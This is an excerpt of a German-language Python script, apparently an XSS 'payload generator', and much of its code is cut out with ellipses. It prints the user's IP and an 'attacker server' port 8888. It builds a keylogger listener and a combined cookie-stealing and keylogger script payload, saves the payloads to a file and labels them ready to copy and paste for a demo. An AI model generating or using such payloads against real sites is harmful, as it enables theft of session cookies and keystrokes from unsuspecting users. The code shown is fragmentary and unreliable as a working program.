...
def main():
    ...
    print("╔" + "="*70 + "╗")
    print("║" + " "*20 + "PAYLOAD GENERATOR" + " "*34 + "║")
    print("╚" + "="*70 + "╝\n")

    print(f"📡 Deine IP-Adresse: {ip}")
    print(f"🎯 Attacker-Server Port: 8888\n")
    print("="*72)
...
document.addEventListener('keypress', function(e) {{
    ...
    # Kombiniert
    print("\n💥 KOMBINIERTER ANGRIFF (Cookie + Keylogger):\n")
    print("-" * 72)
    combined = f"""<script>
// Cookie stehlen
...
setInterval(function(){{
    ...
    print(f"\n✅ Payloads wurden auch gespeichert in: {filename}")
    print("\n📋 COPY-PASTE BEREIT!\n")

    # Quick-Copy Empfehlung
    print("🎯 EMPFEHLUNG FÜR DEMO:")
    print("-" * 72)
